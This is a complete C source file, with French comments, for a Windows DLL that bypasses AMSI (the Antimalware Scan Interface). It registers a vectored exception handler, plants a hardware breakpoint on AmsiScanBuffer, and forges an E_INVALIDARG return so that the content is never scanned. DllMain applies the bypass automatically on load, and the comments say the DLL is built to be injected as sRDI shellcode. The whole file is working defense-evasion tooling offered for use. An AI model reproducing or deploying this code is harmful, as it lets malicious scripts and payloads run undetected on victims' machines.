#include <windows.h>

// Compile into DLL : gcc -shared -o VEHsquered.dll VEHsquered.c

// Variable globale
PVOID g_pAmsiScanBuffer = NULL;

// 1. Le gestionnaire VEH (La partie complexe)
LONG WINAPI VehSquaredHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    OutputDebugStringA("Out of IFs");
    // Si c'est le int3 qui est déclenché, on place le HWBP sur AmsiScanBuffer
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
        OutputDebugStringA("Int3 Triggered");
        ExceptionInfo->ContextRecord->Dr0 = (DWORD64)g_pAmsiScanBuffer;
        ExceptionInfo->ContextRecord->Dr7 = 1; 
        ExceptionInfo->ContextRecord->Rip++; // Skip the int3
        return EXCEPTION_CONTINUE_EXECUTION;
    } 
    // Si c'est le HWBP qui est declanché, on check si c'est bien AmsiScanBuffer, 
    // et si oui on modifie le contexte pour faire comme si AmsiScanBuffer avait retourné E_INVALIDARG
    else if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        OutputDebugStringA("HWBP Triggered");
        if (ExceptionInfo->ExceptionRecord->ExceptionAddress == g_pAmsiScanBuffer) {
            OutputDebugStringA("AmsiScanBuffer Hit");
            ExceptionInfo->ContextRecord->Rax = 0x80070057; // E_INVALIDARG
            ExceptionInfo->ContextRecord->Rip = *(PDWORD64)ExceptionInfo->ContextRecord->Rsp; //Return to the caller of AmsiScanBuffer
            ExceptionInfo->ContextRecord->Rsp += 8; //Simulate the pop of the return address
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// 2. La fonction d'initialisation
void apply_veh_squared_bypass() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;
    g_pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!g_pAmsiScanBuffer) return;
    
    AddVectoredExceptionHandler(1, VehSquaredHandler);
    OutputDebugStringA("Vectored Exception Handler Added !");
    __debugbreak(); // Déclenche le VEH²
    OutputDebugStringA("VEH Squared Bypass Applied !");
}

// 3. LE POINT D'ENTRÉE (Obligatoire pour sRDI)
// C'est ce qui sera exécuté automatiquement quand le shellcode sRDI chargera la DLL en mémoire
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    OutputDebugStringA("VEH Squared Bypass");
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        apply_veh_squared_bypass();
    }
    return TRUE;
}